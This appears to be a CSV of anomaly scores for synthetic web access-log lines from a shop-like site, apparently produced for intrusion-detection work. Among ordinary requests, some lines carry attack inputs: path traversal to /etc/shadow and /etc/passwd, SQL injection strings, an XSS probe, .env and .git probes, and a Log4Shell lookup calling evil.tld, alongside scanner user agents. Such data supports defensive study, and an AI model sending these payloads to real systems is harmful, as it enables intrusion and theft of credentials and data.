score_content,score_session,score_fused,score_fused_norm,line
70.11200714111328,,70.11200714111328,70.11200714111328,100.143.229.198 - - [10/Jan/2025:12:02:46 +0100] "HEAD /search?q=phone HTTP/1.1" 200 13903 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.80976104736328,,95.80976104736328,95.80976104736328,205.195.229.38 - - [10/Jan/2025:12:02:47 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 13451 "https://news.ycombinator.com/" "curl/7.85.0"
50.0497932434082,,50.0497932434082,50.0497932434082,152.202.187.47 - - [10/Jan/2025:12:02:49 +0100] "DELETE /search?q=monitor HTTP/1.1" 200 5730 "https://example.com/" "curl/7.85.0"
11041.970703125,,11041.970703125,11041.970703125,226.163.62.105 - - [10/Jan/2025:12:02:49 +0100] "POST /admin HTTP/1.1" 500 656 "https://example.com/" "dirb/2.22"
30229.283203125,,30229.283203125,30229.283203125,97.25.244.164 - - [10/Jan/2025:12:02:50 +0100] "TRACE /api/products HTTP/1.1" 403 553 "-" "sqlmap/1.7.2#stable"
73.36962890625,,73.36962890625,73.36962890625,43.87.115.72 - - [10/Jan/2025:12:02:51 +0100] "OPTIONS /logout HTTP/1.1" 200 5989 "-" "python-requests/2.31.0"
27.291662216186523,,27.291662216186523,27.291662216186523,59.182.18.211 - - [10/Jan/2025:12:02:51 +0100] "POST /search?q=router HTTP/1.1" 200 19641 "-" "nikto/2.5.0"
30172.2421875,,30172.2421875,30172.2421875,241.135.57.238 - - [10/Jan/2025:12:02:51 +0100] "HEAD /contact HTTP/1.1" 403 693 "-" "Wget/1.21.2 (linux-gnu)"
70.09053039550781,,70.09053039550781,70.09053039550781,238.17.119.242 - - [10/Jan/2025:12:02:53 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 6873 "https://www.google.com/" "python-requests/2.31.0"
24.44080924987793,,24.44080924987793,24.44080924987793,192.94.207.232 - - [10/Jan/2025:12:02:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 2074 "-" "curl/7.85.0"
95.76985168457031,,95.76985168457031,95.76985168457031,14.146.252.153 - - [10/Jan/2025:12:02:56 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 4664 "https://news.ycombinator.com/" "curl/7.85.0"
127.05524444580078,,127.05524444580078,127.05524444580078,208.54.4.227 - - [10/Jan/2025:12:02:57 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 3667 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26764658093452454,,0.26764658093452454,0.26764658093452454,51.23.224.225 - - [10/Jan/2025:12:02:58 +0100] "GET /assets/app.css HTTP/1.1" 200 17788 "https://example.com/" "nikto/2.5.0"
127.26447296142578,,127.26447296142578,127.26447296142578,65.179.78.69 - - [10/Jan/2025:12:02:58 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 17280 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.72124481201172,,95.72124481201172,95.72124481201172,43.10.152.85 - - [10/Jan/2025:12:02:59 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://twitter.com/" "curl/7.85.0"
3.169973134994507,,3.169973134994507,3.169973134994507,13.201.207.73 - - [10/Jan/2025:12:03:01 +0100] "GET /assets/app.js HTTP/1.1" 304 7228 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.86652374267578,,95.86652374267578,95.86652374267578,148.148.196.76 - - [10/Jan/2025:12:03:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 204 19775 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.1003532409668,,50.1003532409668,50.1003532409668,243.102.26.137 - - [10/Jan/2025:12:03:01 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 12107 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.314483642578125,,27.314483642578125,27.314483642578125,211.98.106.88 - - [10/Jan/2025:12:03:01 +0100] "POST /api/product?id=123 HTTP/1.1" 200 16670 "-" "python-requests/2.31.0"
35.851627349853516,,35.851627349853516,35.851627349853516,12.6.249.27 - - [10/Jan/2025:12:03:04 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 9976 "https://news.ycombinator.com/" "python-requests/2.31.0"
103.05036926269531,,103.05036926269531,103.05036926269531,175.221.45.91 - - [10/Jan/2025:12:03:05 +0100] "TRACE /wp-login.php HTTP/1.1" 200 13126 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.3616545498371124,,0.3616545498371124,0.3616545498371124,1.144.230.162 - - [10/Jan/2025:12:03:05 +0100] "GET /index.html HTTP/1.1" 200 13228 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.3214285373687744,,2.3214285373687744,2.3214285373687744,222.9.92.211 - - [10/Jan/2025:12:03:05 +0100] "GET / HTTP/1.1" 200 19292 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
50.1087760925293,,50.1087760925293,50.1087760925293,167.109.190.77 - - [10/Jan/2025:12:03:08 +0100] "DELETE /search?q=phone HTTP/1.1" 200 8626 "https://news.ycombinator.com/" "nikto/2.5.0"
127.16948699951172,,127.16948699951172,127.16948699951172,6.107.194.97 - - [10/Jan/2025:12:03:08 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 4802 "-" "curl/7.85.0"
13.307376861572266,,13.307376861572266,13.307376861572266,26.150.198.67 - - [10/Jan/2025:12:03:08 +0100] "PUT /api/products HTTP/1.1" 200 3032 "https://example.com/" "dirb/2.22"
76.36821746826172,,76.36821746826172,76.36821746826172,16.48.21.13 - - [10/Jan/2025:12:03:09 +0100] "OPTIONS /login HTTP/1.1" 304 18202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.1927809715270996,,3.1927809715270996,3.1927809715270996,77.220.83.242 - - [10/Jan/2025:12:03:09 +0100] "GET /assets/app.css HTTP/1.1" 304 19962 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
127.11963653564453,,127.11963653564453,127.11963653564453,26.217.76.7 - - [10/Jan/2025:12:03:10 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 19135 "-" "nikto/2.5.0"
2.0417721271514893,,2.0417721271514893,2.0417721271514893,164.150.137.60 - - [10/Jan/2025:12:03:13 +0100] "GET /logout HTTP/1.1" 200 12097 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
70.04492950439453,,70.04492950439453,70.04492950439453,114.118.102.151 - - [10/Jan/2025:12:03:16 +0100] "HEAD /search?q=router HTTP/1.1" 200 4273 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.8677167892456055,,4.8677167892456055,4.8677167892456055,232.245.31.125 - - [10/Jan/2025:12:03:16 +0100] "POST /contact HTTP/1.1" 200 15329 "https://example.com/" "curl/7.85.0"
30.092973709106445,,30.092973709106445,30.092973709106445,210.132.62.129 - - [10/Jan/2025:12:03:16 +0100] "POST /search?q=laptop HTTP/1.1" 302 2034 "https://news.ycombinator.com/" "nikto/2.5.0"
95.76496124267578,,95.76496124267578,95.76496124267578,59.128.215.78 - - [10/Jan/2025:12:03:17 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 237 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.76460266113281,,104.76460266113281,104.76460266113281,142.231.73.169 - - [10/Jan/2025:12:03:20 +0100] "TRACE /contact HTTP/1.1" 200 13403 "-" "nikto/2.5.0"
27.785627365112305,,27.785627365112305,27.785627365112305,132.247.156.122 - - [10/Jan/2025:12:03:23 +0100] "DELETE /about HTTP/1.1" 200 18284 "https://www.google.com/" "nikto/2.5.0"
24.443370819091797,,24.443370819091797,24.443370819091797,19.54.209.111 - - [10/Jan/2025:12:03:23 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14193 "-" "curl/7.85.0"
13.494629859924316,,13.494629859924316,13.494629859924316,207.174.123.242 - - [10/Jan/2025:12:03:24 +0100] "PUT /about HTTP/1.1" 200 12709 "https://www.google.com/" "python-requests/2.31.0"
70.09211730957031,,70.09211730957031,70.09211730957031,240.12.183.108 - - [10/Jan/2025:12:03:27 +0100] "HEAD /search?q=laptop HTTP/1.1" 200 14820 "https://www.google.com/" "python-requests/2.31.0"
24.441621780395508,,24.441621780395508,24.441621780395508,25.160.19.9 - - [10/Jan/2025:12:03:30 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 11142 "https://news.ycombinator.com/" "dirb/2.22"
4.877768516540527,,4.877768516540527,4.877768516540527,69.33.76.168 - - [10/Jan/2025:12:03:31 +0100] "GET /logout HTTP/1.1" 302 3256 "https://www.google.com/" "nikto/2.5.0"
47.771629333496094,,47.771629333496094,47.771629333496094,31.58.112.41 - - [10/Jan/2025:12:03:34 +0100] "HEAD /login HTTP/1.1" 200 19778 "https://twitter.com/" "sqlmap/1.7.2#stable"
72.911865234375,,72.911865234375,72.911865234375,2.203.54.114 - - [10/Jan/2025:12:03:37 +0100] "HEAD /search?q=router HTTP/1.1" 301 6695 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2697841227054596,,0.2697841227054596,0.2697841227054596,128.243.179.216 - - [10/Jan/2025:12:03:37 +0100] "GET /assets/app.css HTTP/1.1" 200 18476 "https://www.google.com/" "python-requests/2.31.0"
104.61543273925781,,104.61543273925781,104.61543273925781,139.60.51.242 - - [10/Jan/2025:12:03:38 +0100] "TRACE /phpmyadmin HTTP/1.1" 201 3229 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
11.591416358947754,,11.591416358947754,11.591416358947754,80.47.139.39 - - [10/Jan/2025:12:03:40 +0100] "PUT /../../etc/passwd HTTP/1.1" 200 6803 "-" "curl/7.85.0"
70.10749816894531,,70.10749816894531,70.10749816894531,178.147.180.31 - - [10/Jan/2025:12:03:43 +0100] "HEAD /search?q=camera HTTP/1.1" 200 19542 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.76783561706543,,27.76783561706543,27.76783561706543,98.231.154.132 - - [10/Jan/2025:12:03:45 +0100] "DELETE /login HTTP/1.1" 200 13059 "-" "Wget/1.21.2 (linux-gnu)"
11.941712379455566,,11.941712379455566,11.941712379455566,243.95.144.209 - - [10/Jan/2025:12:03:47 +0100] "PUT /.env HTTP/1.1" 200 3146 "https://twitter.com/" "dirb/2.22"
4.799962997436523,,4.799962997436523,4.799962997436523,157.61.254.225 - - [10/Jan/2025:12:03:50 +0100] "GET /api/products HTTP/1.1" 302 8293 "-" "python-requests/2.31.0"
24.422199249267578,,24.422199249267578,24.422199249267578,32.184.149.184 - - [10/Jan/2025:12:03:51 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 8907 "-" "nikto/2.5.0"
4.914912700653076,,4.914912700653076,4.914912700653076,13.214.209.231 - - [10/Jan/2025:12:03:52 +0100] "POST /admin HTTP/1.1" 200 8308 "https://twitter.com/" "curl/7.85.0"
30130.474609375,,30130.474609375,30130.474609375,15.105.110.174 - - [10/Jan/2025:12:03:53 +0100] "POST /api/products HTTP/1.1" 429 975 "https://news.ycombinator.com/" "python-requests/2.31.0"
30197.9296875,,30197.9296875,30197.9296875,227.177.184.54 - - [10/Jan/2025:12:03:55 +0100] "OPTIONS /about HTTP/1.1" 401 855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.259563446044922,,27.259563446044922,27.259563446044922,39.94.196.178 - - [10/Jan/2025:12:03:57 +0100] "POST /search?q=laptop HTTP/1.1" 200 10478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.15936851501465,,27.15936851501465,27.15936851501465,237.176.173.60 - - [10/Jan/2025:12:03:58 +0100] "POST /search?q=headphones HTTP/1.1" 200 5345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2219025045633316,,0.2219025045633316,0.2219025045633316,237.233.133.76 - - [10/Jan/2025:12:03:59 +0100] "GET /assets/app.css HTTP/1.1" 200 6256 "-" "python-requests/2.31.0"
27.28020477294922,,27.28020477294922,27.28020477294922,106.21.251.157 - - [10/Jan/2025:12:04:00 +0100] "POST /api/product?id=123 HTTP/1.1" 201 8328 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
70.11522674560547,,70.11522674560547,70.11522674560547,9.236.94.178 - - [10/Jan/2025:12:04:00 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 12471 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1495423316955566,,3.1495423316955566,3.1495423316955566,75.120.21.238 - - [10/Jan/2025:12:04:01 +0100] "GET /assets/app.css HTTP/1.1" 302 18891 "https://www.google.com/" "dirb/2.22"
4.9638447761535645,,4.9638447761535645,4.9638447761535645,9.254.160.165 - - [10/Jan/2025:12:04:04 +0100] "GET /login HTTP/1.1" 301 19686 "https://www.google.com/" "curl/7.85.0"
50.15130615234375,,50.15130615234375,50.15130615234375,88.47.11.7 - - [10/Jan/2025:12:04:04 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 17453 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
16.182008743286133,,16.182008743286133,16.182008743286133,184.179.229.75 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/products HTTP/1.1" 302 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.8768196105957,,35.8768196105957,35.8768196105957,166.175.137.188 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 19821 "-" "sqlmap/1.7.2#stable"
102.9722900390625,,102.9722900390625,102.9722900390625,139.97.237.230 - - [10/Jan/2025:12:04:08 +0100] "TRACE /../../etc/passwd HTTP/1.1" 200 18574 "https://www.google.com/" "sqlmap/1.7.2#stable"
27.644697189331055,,27.644697189331055,27.644697189331055,20.66.107.129 - - [10/Jan/2025:12:04:09 +0100] "DELETE /api/products HTTP/1.1" 200 18644 "https://twitter.com/" "curl/7.85.0"
45.78758239746094,,45.78758239746094,45.78758239746094,138.121.252.30 - - [10/Jan/2025:12:04:10 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17063 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.5799503326416,,27.5799503326416,27.5799503326416,49.158.99.16 - - [10/Jan/2025:12:04:13 +0100] "DELETE /dashboard HTTP/1.1" 200 3467 "-" "python-requests/2.31.0"
2.0065951347351074,,2.0065951347351074,2.0065951347351074,70.253.241.176 - - [10/Jan/2025:12:04:15 +0100] "GET /logout HTTP/1.1" 200 4491 "https://example.com/" "sqlmap/1.7.2#stable"
11.568084716796875,,11.568084716796875,11.568084716796875,68.182.53.119 - - [10/Jan/2025:12:04:18 +0100] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2169 "https://www.google.com/" "python-requests/2.31.0"
127.11677551269531,,127.11677551269531,127.11677551269531,131.231.214.243 - - [10/Jan/2025:12:04:19 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 18206 "https://example.com/" "python-requests/2.31.0"
2.3143491744995117,,2.3143491744995117,2.3143491744995117,43.57.35.166 - - [10/Jan/2025:12:04:22 +0100] "GET / HTTP/1.1" 200 17016 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
47.66352462768555,,47.66352462768555,47.66352462768555,68.223.154.86 - - [10/Jan/2025:12:04:23 +0100] "HEAD /contact HTTP/1.1" 200 10360 "https://example.com/" "dirb/2.22"
130.12660217285156,,130.12660217285156,130.12660217285156,73.159.65.114 - - [10/Jan/2025:12:04:23 +0100] "TRACE /search?q=ssd HTTP/1.1" 301 19987 "https://twitter.com/" "python-requests/2.31.0"
27.215791702270508,,27.215791702270508,27.215791702270508,161.212.223.94 - - [10/Jan/2025:12:04:25 +0100] "POST /search?q=headphones HTTP/1.1" 200 19686 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.34591570496559143,,0.34591570496559143,0.34591570496559143,228.243.180.254 - - [10/Jan/2025:12:04:27 +0100] "GET /index.html HTTP/1.1" 200 9320 "https://news.ycombinator.com/" "dirb/2.22"
30125.0546875,,30125.0546875,30125.0546875,147.137.114.95 - - [10/Jan/2025:12:04:29 +0100] "GET /assets/app.js HTTP/1.1" 401 8 "https://www.google.com/" "curl/7.85.0"
70.09127807617188,,70.09127807617188,70.09127807617188,50.188.57.13 - - [10/Jan/2025:12:04:31 +0100] "HEAD /search?q=phone HTTP/1.1" 200 8824 "https://news.ycombinator.com/" "python-requests/2.31.0"
30.2072696685791,,30.2072696685791,30.2072696685791,4.227.200.145 - - [10/Jan/2025:12:04:34 +0100] "POST /search?q=ssd HTTP/1.1" 302 10301 "https://twitter.com/" "nikto/2.5.0"
24.360637664794922,,24.360637664794922,24.360637664794922,215.211.202.173 - - [10/Jan/2025:12:04:34 +0100] "GET /search?q=monitor HTTP/1.1" 200 5332 "https://twitter.com/" "python-requests/2.31.0"
127.17123413085938,,127.17123413085938,127.17123413085938,61.116.77.49 - - [10/Jan/2025:12:04:36 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7004 "https://news.ycombinator.com/" "nikto/2.5.0"
0.27600568532943726,,0.27600568532943726,0.27600568532943726,54.224.145.176 - - [10/Jan/2025:12:04:39 +0100] "GET /assets/app.js HTTP/1.1" 204 14818 "-" "curl/7.85.0"
0.27089235186576843,,0.27089235186576843,0.27089235186576843,247.139.11.226 - - [10/Jan/2025:12:04:40 +0100] "GET /assets/app.js HTTP/1.1" 200 11640 "https://twitter.com/" "dirb/2.22"
47.599098205566406,,47.599098205566406,47.599098205566406,229.170.178.17 - - [10/Jan/2025:12:04:40 +0100] "HEAD /dashboard HTTP/1.1" 200 11301 "https://www.google.com/" "nikto/2.5.0"
1.8943930864334106,,1.8943930864334106,1.8943930864334106,172.117.173.129 - - [10/Jan/2025:12:04:40 +0100] "GET /api/products HTTP/1.1" 200 2795 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
35.86091613769531,,35.86091613769531,35.86091613769531,107.114.101.102 - - [10/Jan/2025:12:04:43 +0100] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 2176 "https://example.com/" "python-requests/2.31.0"
11164.177734375,,11164.177734375,11164.177734375,78.231.98.112 - - [10/Jan/2025:12:04:46 +0100] "TRACE /search?q=phone HTTP/1.1" 500 735 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.512887954711914,,13.512887954711914,13.512887954711914,52.52.170.78 - - [10/Jan/2025:12:04:46 +0100] "PUT /about HTTP/1.1" 200 18021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.2162933349609375,,5.2162933349609375,5.2162933349609375,1.48.175.184 - - [10/Jan/2025:12:04:48 +0100] "GET / HTTP/1.1" 304 12495 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
38.83927917480469,,38.83927917480469,38.83927917480469,26.1.93.29 - - [10/Jan/2025:12:04:50 +0100] "PUT /search?q=ssd HTTP/1.1" 304 18345 "https://example.com/" "nikto/2.5.0"
0.2749665677547455,,0.2749665677547455,0.2749665677547455,64.15.220.69 - - [10/Jan/2025:12:04:51 +0100] "GET /assets/app.js HTTP/1.1" 200 12693 "-" "dirb/2.22"
24.390819549560547,,24.390819549560547,24.390819549560547,172.70.253.117 - - [10/Jan/2025:12:04:53 +0100] "GET /search?q=laptop HTTP/1.1" 200 7041 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.624542236328125,,27.624542236328125,27.624542236328125,140.235.149.35 - - [10/Jan/2025:12:04:53 +0100] "DELETE /dashboard HTTP/1.1" 200 13080 "https://news.ycombinator.com/" "dirb/2.22"
35.87032699584961,,35.87032699584961,35.87032699584961,81.51.111.55 - - [10/Jan/2025:12:04:53 +0100] "PUT /search?q=phone HTTP/1.1" 200 17426 "-" "python-requests/2.31.0"
52.83726501464844,,52.83726501464844,52.83726501464844,240.161.17.55 - - [10/Jan/2025:12:04:55 +0100] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 11095 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30174.337890625,,30174.337890625,30174.337890625,240.144.139.254 - - [10/Jan/2025:12:04:58 +0100] "DELETE /search?q=camera HTTP/1.1" 401 353 "https://example.com/" "python-requests/2.31.0"
30126.494140625,,30126.494140625,30126.494140625,240.200.192.126 - - [10/Jan/2025:12:05:01 +0100] "GET /about HTTP/1.1" 400 762 "https://twitter.com/" "dirb/2.22"
0.35250067710876465,,0.35250067710876465,0.35250067710876465,208.72.111.241 - - [10/Jan/2025:12:05:03 +0100] "GET /index.html HTTP/1.1" 200 10875 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.2567085027694702,,0.2567085027694702,0.2567085027694702,250.44.25.197 - - [10/Jan/2025:12:05:06 +0100] "GET /assets/app.css HTTP/1.1" 200 14500 "https://example.com/" "python-requests/2.31.0"
72.95974731445312,,72.95974731445312,72.95974731445312,222.196.83.75 - - [10/Jan/2025:12:05:07 +0100] "HEAD /api/product?id=123 HTTP/1.1" 302 5948 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.21282196044922,,127.21282196044922,127.21282196044922,118.129.75.186 - - [10/Jan/2025:12:05:10 +0100] "TRACE /search?q=phone HTTP/1.1" 201 17849 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.22111596167087555,,0.22111596167087555,0.22111596167087555,228.75.88.124 - - [10/Jan/2025:12:05:10 +0100] "GET /assets/app.css HTTP/1.1" 200 417 "https://news.ycombinator.com/" "curl/7.85.0"
0.2541857063770294,,0.2541857063770294,0.2541857063770294,77.70.253.154 - - [10/Jan/2025:12:05:11 +0100] "GET /assets/app.css HTTP/1.1" 201 14350 "https://twitter.com/" "python-requests/2.31.0"
30.176738739013672,,30.176738739013672,30.176738739013672,126.139.154.86 - - [10/Jan/2025:12:05:11 +0100] "POST /api/product?id=123 HTTP/1.1" 302 13335 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.9405436515808105,,1.9405436515808105,1.9405436515808105,56.70.45.68 - - [10/Jan/2025:12:05:13 +0100] "GET /api/products HTTP/1.1" 200 12680 "https://www.google.com/" "python-requests/2.31.0"
45.9686279296875,,45.9686279296875,45.9686279296875,239.140.102.87 - - [10/Jan/2025:12:05:16 +0100] "HEAD /.git/config HTTP/1.1" 200 7440 "https://example.com/" "curl/7.85.0"
27.658653259277344,,27.658653259277344,27.658653259277344,206.28.202.105 - - [10/Jan/2025:12:05:16 +0100] "DELETE /profile HTTP/1.1" 200 5410 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.66132354736328,,104.66132354736328,104.66132354736328,129.167.154.200 - - [10/Jan/2025:12:05:18 +0100] "TRACE /api/products HTTP/1.1" 200 5261 "-" "curl/7.85.0"
24.58355712890625,,24.58355712890625,24.58355712890625,216.46.172.251 - - [10/Jan/2025:12:05:21 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 10282 "https://example.com/" "curl/7.85.0"
47.62374496459961,,47.62374496459961,47.62374496459961,148.173.230.179 - - [10/Jan/2025:12:05:21 +0100] "HEAD /contact HTTP/1.1" 200 2179 "-" "sqlmap/1.7.2#stable"
1.9985960721969604,,1.9985960721969604,1.9985960721969604,89.4.217.110 - - [10/Jan/2025:12:05:22 +0100] "GET /profile HTTP/1.1" 200 10473 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.803883075714111,,4.803883075714111,4.803883075714111,235.223.126.156 - - [10/Jan/2025:12:05:25 +0100] "POST /contact HTTP/1.1" 204 1040 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.4242172241211,,71.4242172241211,71.4242172241211,233.54.58.232 - - [10/Jan/2025:12:05:26 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 423 "-" "curl/7.85.0"
27.629671096801758,,27.629671096801758,27.629671096801758,166.230.129.98 - - [10/Jan/2025:12:05:27 +0100] "DELETE /api/products HTTP/1.1" 200 14114 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11041.9541015625,,11041.9541015625,11041.9541015625,75.50.96.203 - - [10/Jan/2025:12:05:30 +0100] "POST /api/products HTTP/1.1" 502 614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.410554885864258,,24.410554885864258,24.410554885864258,46.35.178.117 - - [10/Jan/2025:12:05:31 +0100] "GET /search?q=monitor HTTP/1.1" 200 17601 "https://twitter.com/" "dirb/2.22"
95.72412872314453,,95.72412872314453,95.72412872314453,59.84.85.44 - - [10/Jan/2025:12:05:32 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 1341 "-" "Wget/1.21.2 (linux-gnu)"
35.81241226196289,,35.81241226196289,35.81241226196289,229.75.227.215 - - [10/Jan/2025:12:05:34 +0100] "PUT /search?q=laptop HTTP/1.1" 200 8360 "https://www.google.com/" "dirb/2.22"
76.19699096679688,,76.19699096679688,76.19699096679688,228.224.189.237 - - [10/Jan/2025:12:05:36 +0100] "OPTIONS /phpmyadmin HTTP/1.1" 304 19440 "-" "curl/7.85.0"
1.9019558429718018,,1.9019558429718018,1.9019558429718018,167.130.124.94 - - [10/Jan/2025:12:05:39 +0100] "GET /api/products HTTP/1.1" 200 4267 "-" "curl/7.85.0"
24.488330841064453,,24.488330841064453,24.488330841064453,67.90.180.169 - - [10/Jan/2025:12:05:42 +0100] "GET /search?q=ssd HTTP/1.1" 204 14133 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.850922107696533,,4.850922107696533,4.850922107696533,225.249.171.128 - - [10/Jan/2025:12:05:45 +0100] "POST /contact HTTP/1.1" 200 10837 "https://example.com/" "sqlmap/1.7.2#stable"
104.75332641601562,,104.75332641601562,104.75332641601562,126.222.182.75 - - [10/Jan/2025:12:05:48 +0100] "TRACE /contact HTTP/1.1" 200 10536 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
